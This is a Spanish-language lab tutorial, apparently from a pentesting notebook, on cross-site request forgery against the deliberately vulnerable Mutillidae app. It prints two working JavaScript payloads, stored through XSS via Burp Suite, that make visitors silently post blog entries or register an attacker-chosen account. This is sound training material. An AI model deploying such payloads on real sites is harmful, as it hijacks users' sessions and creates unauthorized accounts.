# CSRF (Cross-site request forgery)

Con esto basicamente lo que hacemos es forzar a un usuario legitimo que esta logeado en una aplicacion web realice una accion que ni si quiera sabe que esta realizando.

Vamos a coger un script que ya nos proporciona la pagina `Mutillidae` que seria el siguiente:

```html
<script>
	var lXMLHTTP;
	try{
		var lBlogEntry = encodeURI("Entrada de blog anadida mediante CSRF");

		var lData = "csrf-token=&blog_entry="+lBlogEntry+"&add-to-your-blog-php-submit-button=Save+Blog+Entry";
		var lAction = "./index.php?page=add-to-your-blog.php";
		var lMethod = "POST";

		try {
			lXMLHTTP = new ActiveXObject("Msxml2.XMLHTTP");
		}catch(e){
			try {
				lXMLHTTP = new ActiveXObject("Microsoft.XMLHTTP");
			}catch(e){
				try{
					lXMLHTTP = new XMLHttpRequest();
				}catch(e){
					alert(e.message);
				}
			}
		}

		lXMLHTTP.onreadystatechange = function(){
			if(lXMLHTTP.readyState == 4){
				alert("CSRF Complete");
			}
		};

		lXMLHTTP.open(lMethod, lAction, true);
		lXMLHTTP.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
		lXMLHTTP.send(lData);
	}catch(e){
		alert(e.message);
	}
</script>
```

Lo que vamos hacer con esto es que cada vez que un usuario entre en esta entrada de blog, se va a ejecutar en segundo plano esta sentencia bajo su nombre sin que el se de cuenta.

Ponemos a `Burp Suite` a la escucha, para capturar una peticion que nosotros hagamos, una vez que hayamos capturado la peticion poniendo por ejemplo `canario`, nos vamos al `Decoder` y lo codificamos en `URL`, despues esta codificacion la pegamos sustituyendo la palabra `canario`, quedando algo asi:

<figure><img src="../../../.gitbook/assets/image (98) (1).png" alt=""><figcaption></figcaption></figure>

Le daremos a `Forward` y veremos esto:

<figure><img src="../../../.gitbook/assets/image (99) (1).png" alt=""><figcaption></figcaption></figure>

Por lo que vemos que ha funcionado, claramente este popup en una explotacion real, no habria que ponerlo.

Y vemos que algo se ha injectado en el blog:

<figure><img src="../../../.gitbook/assets/image (100) (1).png" alt=""><figcaption></figcaption></figure>

Por lo que cada vez que un usuario acceda a esta pagina se va a estar ejecutando este scrip:

<figure><img src="../../../.gitbook/assets/image (101) (1).png" alt=""><figcaption></figcaption></figure>

Y se va a estar añadiendo una entrada en el blog como el usuario que entre.

Si por ejemplo nosotros nos logeamos con otro usuario, como si fuera otro el usuario que entre y nos dirijimos a ver las entradas de blog en el siguiente apartado:

`OWASP 2017` -> `Cross-Site-Scripting (XSS)` -> `Persistent (Second Order)` -> `View Someone's Blog`.

Seleccionamos el ver todas las entradas `Show all` y le damos a `View Blog Entries`, veremos esto:

<figure><img src="../../../.gitbook/assets/image (102) (1).png" alt=""><figcaption></figcaption></figure>

Veremos que se nos ha ejecutado por detras el script, como este usuario, por lo que si nosotros ahora nos dirigimos a escribir una entrada en el blog:

<figure><img src="../../../.gitbook/assets/image (103) (1).png" alt=""><figcaption></figcaption></figure>

Veremos que ya hay una entrada con este usuario logeado, por lo que ha funcionado correctamente.

Y lo que estamos haciendo con esto es que el usuario realice algunas tareas en nuestro beneficio.

Por ejemplo otro `payload` mas potente es hacer al usuario de que registre otra cuenta:

```html
<script>
	var lXMLHTTP;
	try{
		var lUsername = "csrf_test";
		var lPassword = "csrf_password";
		var lSignature = "Cuenta creada mediante una vulnerabilidad CSRF";
		var lData = "username="+lUsername+"&password="+lPassword+"&confirm_password="+lPassword+"&my_signature="+lSignature+"&register-php-submit-button=Create+Account";
		var lAction = "./index.php?page=register.php";
		var lMethod = "POST";

		try {
			lXMLHTTP = new ActiveXObject("Msxml2.XMLHTTP");
		}catch(e){
			try {
				lXMLHTTP = new ActiveXObject("Microsoft.XMLHTTP");
			}catch(e){
				try{
					lXMLHTTP = new XMLHttpRequest();
				}catch(e){
					alert(e.message);
				}
			}
		}

		lXMLHTTP.onreadystatechange = function(){
			if(lXMLHTTP.readyState == 4){
				alert("CSRF Complete");
			}
		};

		lXMLHTTP.open(lMethod, lAction, true);
		lXMLHTTP.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
		lXMLHTTP.send(lData);
	}catch(e){
		alert(e.message);
	}
</script>
```

Lo que hace esto al usuario es forzar mediante una peticion `AJAX` a crear una nueva cuenta con los parametros que nosotros le indiquemos.

Lo bueno de esto es que si nosotros no podemos crearnos una cuenta ya sea por que es una aplicacion de empresa o solo se puede por invitacion, otro usuario que si tenga acceso a ello podra crearla por nosotros y nosotros podernos logear con dicha cuenta.

Por lo que abriremos `Burp Suite` capturaremos la peticion de `canario` y codificaremos el anterior script en `URL` y lo reemplazaremos por la palabra `canario` quedando algo asi:

<figure><img src="../../../.gitbook/assets/image (104) (1).png" alt=""><figcaption></figcaption></figure>

Le daremos a `Forward` y nos saldra esto:

<figure><img src="../../../.gitbook/assets/image (105) (1).png" alt=""><figcaption></figcaption></figure>

Ahora nos loguearemos con otra cuenta para hacerlo desde un usuario externo.

Nos iremos a `OWASP 2017` -> `Cross-Site-Scripting (XSS)` -> `Persistent (Second Order)` -> `View Someone's Blog`.

Seleccionamos el ver todas las entradas `Show all` y le damos a `View Blog Entries`, veremos esto:

<figure><img src="../../../.gitbook/assets/image (106) (1).png" alt=""><figcaption></figcaption></figure>

Por lo que el usuario con los parametros que especificamos ya se habria creado correctamente bajo este usuario, solo tendremos que probar a introducir las credenciales y veremos lo siguiente:

```
User: csrf_test
Pass: csrf_password
```

<figure><img src="../../../.gitbook/assets/image (107) (1).png" alt=""><figcaption></figcaption></figure>
